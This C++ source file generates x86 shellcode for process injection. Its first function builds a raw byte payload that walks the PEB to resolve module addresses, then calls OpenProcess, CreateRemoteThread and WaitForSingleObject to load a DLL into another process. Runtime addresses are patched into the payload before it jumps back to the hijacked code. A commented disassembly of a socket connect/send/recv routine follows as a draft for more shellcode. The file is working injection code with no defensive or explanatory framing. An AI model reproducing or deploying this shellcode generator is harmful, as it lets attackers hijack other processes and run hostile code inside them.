#include "ShellCodeMaker.h"
//private

void c_ShellCodeMaker::MakeShellCode_CreateRemoteThread(LPVOID &allocMemAddr) {
    unsigned char m_rawShellCode[] = {
        /* pushad                           */  0x60,
        /* mov dword ptr ds:[0x4DE0480],eax */  0xA3, 0xCC, 0xCC, 0xCC, 0xCC,
        /* mov dword ptr ds:[0x4DE0484],ebx */  0x89, 0x1D, 0xCC, 0xCC, 0xCC, 0xCC,
        /* mov dword ptr ds:[0x4DE0488],ecx */  0x89, 0x0D, 0xCC, 0xCC, 0xCC, 0xCC,
        /* mov dword ptr ds:[0x4DE048C],edx */  0x89, 0x15, 0xCC, 0xCC, 0xCC, 0xCC,
        /* mov dword ptr ds:[0x4DE0490],ebp */  0x89, 0x2D, 0xCC, 0xCC, 0xCC, 0xCC,
        /* mov dword ptr ds:[0x4DE0494],esp */  0x89, 0x25, 0xCC, 0xCC, 0xCC, 0xCC,
        /* mov dword ptr ds:[0x4DE0498],esi */  0x89, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* mov dword ptr ds:[0x4DE049C],edi */  0x89, 0x3D, 0xCC, 0xCC, 0xCC, 0xCC,
        /* xor ebx,ebx                      */  0x31, 0xDB,
        /* xor eax,eax                      */  0x31, 0xC0,
        /* push dword ptr ds:[0x4DE0408]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* push dword ptr ds:[0x4DE0404]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* push dword ptr ds:[0x4DE0400]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* call 0x4DE00A9                   */  0xE8, 0x5E, 0x00, 0x00, 0x00,
        /* add eax,dword ptr ds:[0x4DE0440] */  0x03, 0x05, 0xCC, 0xCC, 0xCC, 0xCC,
        /* call eax                         */  0xFF, 0xD0,
        /* mov ebx,eax                      */  0x89, 0xC3,
        /* add esp,0xC                      */  0x83, 0xC4, 0x0C,
        /* xor eax,eax                      */  0x31, 0xC0,
        /* push dword ptr ds:[0x4DE0420]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* push dword ptr ds:[0x4DE041C]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* push dword ptr ds:[0x4DE0418]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* push dword ptr ds:[0x4DE0414]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* push dword ptr ds:[0x4DE0410]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* push dword ptr ds:[0x4DE040C]    */  0xFF, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
        /* push ebx                         */  0x53,
        /* call 0x4DE00A9                   */  0xE8, 0x25, 0x00, 0x00, 0x00,
        /* add eax,dword ptr ds:[0x4DE0444] */  0x03, 0x05, 0xCC, 0xCC, 0xCC, 0xCC,
        /* call eax                         */  0xFF, 0xD0,
        /* add esp,0x1C                     */  0x83, 0xC4, 0x1C,
        /* mov ebx,eax                      */  0x89, 0xC3,
        /* push 0xFFFFFFFF                  */  0x6A, 0xFF,
        /* push ebx                         */  0x53,
        /* call 0x4DE00A9                   */  0xE8, 0x10, 0x00, 0x00, 0x00,
        /* add eax,dword ptr ds:[0x4DE0448] */  0x03, 0x05, 0xCC, 0xCC, 0xCC, 0xCC,
        /* call eax                         */  0xFF, 0xD0,
        /* add esp,0x8                      */  0x83, 0xC4, 0x08,
        /* jmp 0x4DE0E00                    */  0xE9, 0xCC, 0xCC, 0xCC, 0xCC,
        /* xor eax,eax                      */  0x31, 0xC0,
        /* xor ecx,ecx                      */  0x31, 0xC9,
        /* xor esi,esi                      */  0x31, 0xF6,
        /* xor edi,edi                      */  0x31, 0xFF,
        /* mov eax,dword ptr fs:[0x30]      */  0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,
        /* mov eax,dword ptr ds:[eax+0xC]   */  0x8B, 0x40, 0x0C,
        /* add eax,0x1C                     */  0x83, 0xC0, 0x1C,
        /* push dword ptr ds:[eax+0x4]      */  0xFF, 0x70, 0x04,
        /* mov eax,dword ptr ds:[eax]       */  0x8B, 0x00,
        /* push eax                         */  0x50,
        /* cmp eax,dword ptr ss:[esp+0x4]   */  0x3B, 0x44, 0x24, 0x04,
        /* je 0x4DE00E2                     */  0x74, 0x19,
        /* mov ecx,dword ptr ds:[eax+0x1C]  */  0x8B, 0x48, 0x1C,
        /* and ecx,0xFFFF                   */  0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00,
        /* mov esi,dword ptr ds:[eax+0x20]  */  0x8B, 0x70, 0x20,
        /* mov edi,0x4DE0424                */  0xBF, 0xCC, 0xCC, 0xCC, 0xCC,
        /* cld                              */  0xFC,
        /* repe cmpsb                       */  0xF3, 0xA6,
        /* jecxz 0x4DE00E2                  */  0xE3, 0x03,
        /* pop eax                          */  0x58,
        /* jmp 0x4DE00C0                    */  0xEB, 0xDE,
        /* add esp,0x8                      */  0x83, 0xC4, 0x08,
        /* mov eax,dword ptr ds:[eax+0x8]   */  0x8B, 0x40, 0x08,
        /* ret                              */  0xC3
    };
    /*
     * 2    1024+128+0x0
     * 8    1024+128+0x4
     * 14   1024+128+0x8
     * 20   1024+128+0xC
     * 26   1024+128+0x10
     * 32   1024+128+0x14
     * 38   1024+128+0x18
     * 44   1024+128+0x1C
     *
     * 54   arg3    1024+0x08    OpenProcess_dwProcessId
     * 60   arg2    1024+0x04    OpenProcess_bInheritHandle
     * 66   arg1    1024+0x00    OpenProcess_dwDesiredAccess
     * 77   arg11   1024+0x3E    RVA_OpenProcess
     *
     * 92   arg9    1024+0x20    CreateRemoteThread_lpThreadId
     * 98   arg8    1024+0x1C    CreateRemoteThread_dwCreationFlags
     * 104  arg7    1024+0x18    CreateRemoteThread_lpParameter
     * 110  arg6    1024+0x14    CreateRemoteThread_lpStartAddress
     * 116  arg5    1024+0x10    CreateRemoteThread_dwStackSize
     * 122  arg4    1024+0x0C    CreateRemoteThread_lpThreadAttributes
     * 134  arg12   1024+0x42    RVA_CreateRemoteThread
     *
     * 155  arg13   1024+0x46    RVA_WaitForSingleObject
     *
     * 165  Jmp to back up Code
     *
     * 214  arg10   1024+0x24    ptr_DllName
     */
    DWORD m_offsetAddr;
    //init 1024+128+0~28
    for (int i = 0; i < 8; ++i) {
        m_offsetAddr = (DWORD)allocMemAddr + 1024 + 128 + (i * 4);
        m_rawShellCode[2 + (i * 6)] = m_offsetAddr & 0xFF;
        m_rawShellCode[2 + (i * 6) + 1] = m_offsetAddr >> 8 & 0xFF;
        m_rawShellCode[2 + (i * 6) + 2] = m_offsetAddr >> 16 & 0xFF;
        m_rawShellCode[2 + (i * 6) + 3] = m_offsetAddr >> 24 & 0xFF;
    }
    //init arg1~arg3
    for (int i = 0; i < 3; ++i) {
        m_offsetAddr = (DWORD)allocMemAddr + 1024 + (i * 4);
        m_rawShellCode[66 - (i * 6)] = m_offsetAddr & 0xFF;
        m_rawShellCode[66 - (i * 6) + 1] = m_offsetAddr >> 8 & 0xFF;
        m_rawShellCode[66 - (i * 6) + 2] = m_offsetAddr >> 16 & 0xFF;
        m_rawShellCode[66 - (i * 6) + 3] = m_offsetAddr >> 24 & 0xFF;
    }
    //init arg4~arg9
    for (int i = 0; i < 6; ++i) {
        m_offsetAddr = (DWORD)allocMemAddr + 1024 + 0xC + (i * 4);
        m_rawShellCode[122 - (i * 6)] = m_offsetAddr & 0xFF;
        m_rawShellCode[122 - (i * 6) + 1] = m_offsetAddr >> 8 & 0xFF;
        m_rawShellCode[122 - (i * 6) + 2] = m_offsetAddr >> 16 & 0xFF;
        m_rawShellCode[122 - (i * 6) + 3] = m_offsetAddr >> 24 & 0xFF;
    }
    //init arg10~arg13
    //arg10
    m_offsetAddr = (DWORD)allocMemAddr + 1024 + 0x24;
    m_rawShellCode[214] = m_offsetAddr & 0xFF;
    m_rawShellCode[214 + 1] = m_offsetAddr >> 8 & 0xFF;
    m_rawShellCode[214 + 2] = m_offsetAddr >> 16 & 0xFF;
    m_rawShellCode[214 + 3] = m_offsetAddr >> 24 & 0xFF;
    //arg11
    m_offsetAddr = (DWORD)allocMemAddr + 1024 + 0x40;
    m_rawShellCode[77] = m_offsetAddr & 0xFF;
    m_rawShellCode[77 + 1] = m_offsetAddr >> 8 & 0xFF;
    m_rawShellCode[77 + 2] = m_offsetAddr >> 16 & 0xFF;
    m_rawShellCode[77 + 3] = m_offsetAddr >> 24 & 0xFF;
    //arg12
    m_offsetAddr+=4;
    m_rawShellCode[134] = m_offsetAddr & 0xFF;
    m_rawShellCode[134 + 1] = m_offsetAddr >> 8 & 0xFF;
    m_rawShellCode[134 + 2] = m_offsetAddr >> 16 & 0xFF;
    m_rawShellCode[134 + 3] = m_offsetAddr >> 24 & 0xFF;
    //arg13
    m_offsetAddr+=4;
    m_rawShellCode[155] = m_offsetAddr & 0xFF;
    m_rawShellCode[155 + 1] = m_offsetAddr >> 8 & 0xFF;
    m_rawShellCode[155 + 2] = m_offsetAddr >> 16 & 0xFF;
    m_rawShellCode[155 + 3] = m_offsetAddr >> 24 & 0xFF;
    //init jmp offset
    m_offsetAddr = 3415;
    m_rawShellCode[165] = m_offsetAddr & 0xFF;
    m_rawShellCode[165 + 1] = m_offsetAddr >> 8 & 0xFF;
    m_rawShellCode[165 + 2] = m_offsetAddr >> 16 & 0xFF;
    m_rawShellCode[165 + 3] = m_offsetAddr >> 24 & 0xFF;

    memcpy(wCode.shellCode, m_rawShellCode, sizeof(m_rawShellCode));
}
void c_ShellCodeMaker::MakeShellCode_Socket(LPVOID &allocMemAddr) {
    /*
    0004105C | 55                      | push ebp                                                                                     |
    0004105D | 8DAC24 68F8FFFF         | lea ebp,dword ptr ss:[esp-0x798]                                                             |
    00041064 | 81EC 18080000           | sub esp,0x818                                                                                |
    0004106A | A1 04300400             | mov eax,dword ptr ds:[0x43004]                                                               |
    0004106F | 33C5                    | xor eax,ebp                                                                                  |
    00041071 | 8985 94070000           | mov dword ptr ss:[ebp+0x794],eax                                                             |
    00041077 | 53                      | push ebx                                                                                     |
    00041078 | 57                      | push edi                                                                                     | edi:EntryPoint
    00041079 | 33C0                    | xor eax,eax                                                                                  |
    0004107B | 8D7D 80                 | lea edi,dword ptr ss:[ebp-0x80]                                                              | edi:EntryPoint
    0004107E | AB                      | stosd                                                                                        |
    0004107F | 33DB                    | xor ebx,ebx                                                                                  |
    00041081 | 6A 10                   | push 0x10                                                                                    |
    00041083 | 53                      | push ebx                                                                                     |
    00041084 | AB                      | stosd                                                                                        |
    00041085 | AB                      | stosd                                                                                        |
    00041086 | AB                      | stosd                                                                                        |
    00041087 | 8D45 80                 | lea eax,dword ptr ss:[ebp-0x80]                                                              |
    0004108A | 50                      | push eax                                                                                     |
    0004108B | E8 730C0000             | call <JMP.&memset>                                                                           |
    00041090 | 83C4 0C                 | add esp,0xC                                                                                  |
    00041093 | 6A 02                   | push 0x2                                                                                     |
    00041095 | 58                      | pop eax                                                                                      |
    00041096 | 68 18210400             | push copyofshellcode.42118                                                                   | 42118:"127.0.0.1"
    0004109B | 66:8945 80              | mov word ptr ss:[ebp-0x80],ax                                                                |
    0004109F | FF15 50200400           | call dword ptr ds:[<&inet_addr>]                                                             |
    000410A5 | 68 FFFF0000             | push 0xFFFF                                                                                  |
    000410AA | 8945 84                 | mov dword ptr ss:[ebp-0x7C],eax                                                              |
    000410AD | FF15 54200400           | call dword ptr ds:[<&htons>]                                                                 |
    000410B3 | 66:8945 82              | mov word ptr ss:[ebp-0x7E],ax                                                                |
    000410B7 | A1 18300400             | mov eax,dword ptr ds:[0x43018]                                                               |
    000410BC | 85C0                    | test eax,eax                                                                                 |
    000410BE | 75 0A                   | jne copyofshellcode.410CA                                                                    |
    000410C0 | E8 3BFFFFFF             | call <copyofshellcode.fn_CreateSocket>                                                       |
    000410C5 | A3 18300400             | mov dword ptr ds:[0x43018],eax                                                               |
    000410CA | 6A 10                   | push 0x10                                                                                    |
    000410CC | 8D4D 80                 | lea ecx,dword ptr ss:[ebp-0x80]                                                              | ecx:EntryPoint
    000410CF | 51                      | push ecx                                                                                     | ecx:EntryPoint
    000410D0 | 50                      | push eax                                                                                     |
    000410D1 | FF15 58200400           | call dword ptr ds:[<&connect>]                                                               |
    000410D7 | 83F8 FF                 | cmp eax,0xFFFFFFFF                                                                           |
    000410DA | 75 0D                   | jne copyofshellcode.410E9                                                                    |
    000410DC | 891D 18300400           | mov dword ptr ds:[0x43018],ebx                                                               |
    000410E2 | E8 6EFFFFFF             | call copyofshellcode.41055                                                                   |
    000410E7 | EB 7D                   | jmp copyofshellcode.41166                                                                    |
    000410E9 | 56                      | push esi                                                                                     | esi:EntryPoint
    000410EA | 6A 1B                   | push 0x1B                                                                                    |
    000410EC | 59                      | pop ecx                                                                                      | ecx:EntryPoint
    000410ED | BE 28210400             | mov esi,copyofshellcode.42128                                                                | esi:EntryPoint, 42128:"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"
    000410F2 | 8D7D 90                 | lea edi,dword ptr ss:[ebp-0x70]                                                              | edi:EntryPoint
    000410F5 | F3:A5                   | rep movsd                                                                                    |
    000410F7 | 68 92070000             | push 0x792                                                                                   |
    000410FC | 8D45 FF                 | lea eax,dword ptr ss:[ebp-0x1]                                                               |
    000410FF | 53                      | push ebx                                                                                     |
    00041100 | 66:A5                   | movsw                                                                                        |
    00041102 | 50                      | push eax                                                                                     |
    00041103 | A4                      | movsb                                                                                        |
    00041104 | E8 FA0B0000             | call <JMP.&memset>                                                                           |
    00041109 | 83C4 0C                 | add esp,0xC                                                                                  |
    0004110C | 8D45 90                 | lea eax,dword ptr ss:[ebp-0x70]                                                              |
    0004110F | 53                      | push ebx                                                                                     |
    00041110 | 50                      | push eax                                                                                     |
    00041111 | E8 050C0000             | call <JMP.&strlen>                                                                           |
    00041116 | 59                      | pop ecx                                                                                      | ecx:EntryPoint
    00041117 | 50                      | push eax                                                                                     |
    00041118 | 8D45 90                 | lea eax,dword ptr ss:[ebp-0x70]                                                              |
    0004111B | 50                      | push eax                                                                                     |
    0004111C | FF35 18300400           | push dword ptr ds:[0x43018]                                                                  |
    00041122 | FF15 48200400           | call dword ptr ds:[<&send>]                                                                  |
    00041128 | 68 01080000             | push 0x801                                                                                   |
    0004112D | 8D45 90                 | lea eax,dword ptr ss:[ebp-0x70]                                                              |
    00041130 | 53                      | push ebx                                                                                     |
    00041131 | 50                      | push eax                                                                                     |
    00041132 | E8 CC0B0000             | call <JMP.&memset>                                                                           |
    00041137 | 83C4 0C                 | add esp,0xC                                                                                  |
    0004113A | 8D45 90                 | lea eax,dword ptr ss:[ebp-0x70]                                                              |
    0004113D | 53                      | push ebx                                                                                     |
    0004113E | 68 00080000             | push 0x800                                                                                   |
    00041143 | 50                      | push eax                                                                                     |
    00041144 | FF35 18300400           | push dword ptr ds:[0x43018]                                                                  |
    0004114A | FF15 4C200400           | call dword ptr ds:[<&recv>]                                                                  |
    00041150 | 5E                      | pop esi                                                                                      | esi:EntryPoint
    00041151 | 85C0                    | test eax,eax                                                                                 |
    00041153 | 7F 05                   | jg copyofshellcode.4115A                                                                     |
    00041155 | E8 FBFEFFFF             | call copyofshellcode.41055                                                                   |
    0004115A | FF35 18300400           | push dword ptr ds:[0x43018]                                                                  |
    00041160 | FF15 64200400           | call dword ptr ds:[<&closesocket>]                                                           |
    00041166 | 8B8D 94070000           | mov ecx,dword ptr ss:[ebp+0x794]                                                             | ecx:EntryPoint
    0004116C | 5F                      | pop edi                                                                                      | edi:EntryPoint
    0004116D | 33CD                    | xor ecx,ebp                                                                                  | ecx:EntryPoint
    0004116F | 5B                      | pop ebx                                                                                      |
    00041170 | E8 10000000             | call copyofshellcode.41185                                                                   |
    00041175 | 81C5 98070000           | add ebp,0x798                                                                                |
    0004117B | C9                      | leave                                                                                        |
    0004117C | C3                      | ret                                                                                          |
    0004117D | E8 DAFEFFFF             | call copyofshellcode.4105C                                                                   |
    00041182 | 33C0                    | xor eax,eax                                                                                  |
    00041184 | C3                      | ret                                                                                          |
     */
}
